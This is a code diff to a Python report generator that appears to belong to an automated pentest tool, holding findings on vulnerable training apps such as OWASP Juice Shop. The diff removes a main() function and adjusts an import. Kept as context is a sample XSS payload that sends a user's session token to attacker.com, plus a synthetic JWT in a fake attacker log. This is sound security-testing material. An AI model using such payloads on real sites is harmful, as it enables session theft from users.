@@ -1180,7 +1180,7 @@ JUICE_SHOP_FINDINGS: list[Finding] = [
                     "--- JWT THEFT VARIANT ---\n"
                     "<iframe src=\"javascript:fetch('http://attacker.com/steal?t='+localStorage.getItem('token'))\">\n\n"
                     "Attacker server log:\n"
-                    "GET /steal?t=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJhY3RpdmUiLCJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIn19"
+                    "GET /steal?t=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJhY3RpdmUiLCJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIn19"  # gitleaks:allow -- synthetic Juice Shop evidence
                 ),
             ),
         ],
@@ -3686,104 +3686,6 @@ NODEGOAT_ATTACK_CHAINS = [
 
 
 # =====================================================================
-# MAIN
-# =====================================================================
-
-def main() -> None:
-    gen = ReportGenerator()
-    reports_dir = Path(__file__).parent / "reports"
-    reports_dir.mkdir(parents=True, exist_ok=True)
-
-    # --- DVWA Report ---
-    dvwa_data = ReportData(
-        scan_id="dvwa-bench-20260330",
-        client_name="DVWA (Damn Vulnerable Web Application)",
-        target="http://localhost:8080",
-        scan_date="2026-03-30",
-        findings=DVWA_FINDINGS,
-        company_name="VXIS Security",
-        author="VXIS Autonomous Brain",
-        executive_summary=DVWA_EXECUTIVE_SUMMARY,
-        attack_chains=DVWA_ATTACK_CHAINS,
-    )
-
-    dvwa_path = gen.generate_html_file(
-        dvwa_data,
-        reports_dir / "report_dvwa_20260330.html",
-    )
-    print(f"[OK] DVWA report: {dvwa_path}")
-    print(f"     Findings: {dvwa_data.total_findings}")
-    print(f"     Severity: {dvwa_data.severity_counts}")
-    print(f"     Risk Score: {dvwa_data.risk_score}/10")
-
-    # --- Juice Shop Report ---
-    juice_data = ReportData(
-        scan_id="juice-bench-20260330",
-        client_name="OWASP Juice Shop",
-        target="http://localhost:3000",
-        scan_date="2026-03-30",
-        findings=JUICE_SHOP_FINDINGS,
-        company_name="VXIS Security",
-        author="VXIS Autonomous Brain",
-        executive_summary=JUICE_SHOP_EXECUTIVE_SUMMARY,
-        attack_chains=JUICE_SHOP_ATTACK_CHAINS,
-    )
-
-    juice_path = gen.generate_html_file(
-        juice_data,
-        reports_dir / "report_juice_shop_20260330.html",
-    )
-    print(f"\n[OK] Juice Shop report: {juice_path}")
-    print(f"     Findings: {juice_data.total_findings}")
-    print(f"     Severity: {juice_data.severity_counts}")
-    print(f"     Risk Score: {juice_data.risk_score}/10")
-
-    # --- WebGoat Report ---
-    webgoat_data = ReportData(
-        scan_id="webgoat-2026-03-31",
-        client_name="OWASP WebGoat 8.2 — VXIS Autonomous Scan",
-        target="http://localhost:8080/WebGoat",
-        scan_date="2026-03-31",
-        findings=WEBGOAT_FINDINGS,
-        company_name="VXIS Security",
-        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
-        executive_summary=WEBGOAT_EXECUTIVE_SUMMARY,
-        attack_chains=WEBGOAT_ATTACK_CHAINS,
-    )
-
-    webgoat_path = gen.generate_html_file(
-        webgoat_data,
-        reports_dir / "report_webgoat_20260331.html",
-    )
-    print(f"\n[OK] WebGoat report: {webgoat_path}")
-    print(f"     Findings: {webgoat_data.total_findings}")
-    print(f"     Severity: {webgoat_data.severity_counts}")
-    print(f"     Risk Score: {webgoat_data.risk_score}/10")
-
-    # --- NodeGoat Report ---
-    nodegoat_data = ReportData(
-        scan_id="nodegoat-2026-03-31",
-        client_name="OWASP NodeGoat (Node.js/Express/MongoDB)",
-        target="http://localhost:4000",
-        scan_date="2026-03-31",
-        findings=NODEGOAT_FINDINGS,
-        company_name="VXIS Security",
-        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
-        executive_summary=NODEGOAT_EXECUTIVE_SUMMARY,
-        attack_chains=NODEGOAT_ATTACK_CHAINS,
-    )
-
-    nodegoat_path = gen.generate_html_file(
-        nodegoat_data,
-        reports_dir / "report_nodegoat_20260331.html",
-    )
-    print(f"\n[OK] NodeGoat report: {nodegoat_path}")
-    print(f"     Findings: {nodegoat_data.total_findings}")
-    print(f"     Severity: {nodegoat_data.severity_counts}")
-    print(f"     Risk Score: {nodegoat_data.risk_score}/10")
-
-
-# =====================================================================
 # LIVE SCAN REPORT GENERATION
 # =====================================================================
 
@@ -4057,7 +3959,7 @@ def run_live_scan_and_report(
         os.environ["OPENAI_API_KEY"] = os.environ["LLM_API_KEY"]
 
     from vxis.agent.brain import AgentBrain
-    from vxis.pipeline.pipeline import ScanPipeline
+    from vxis.pipeline import ScanPipeline
     from vxis.report.generator import ReportData, ReportGenerator
 
     brain = AgentBrain()
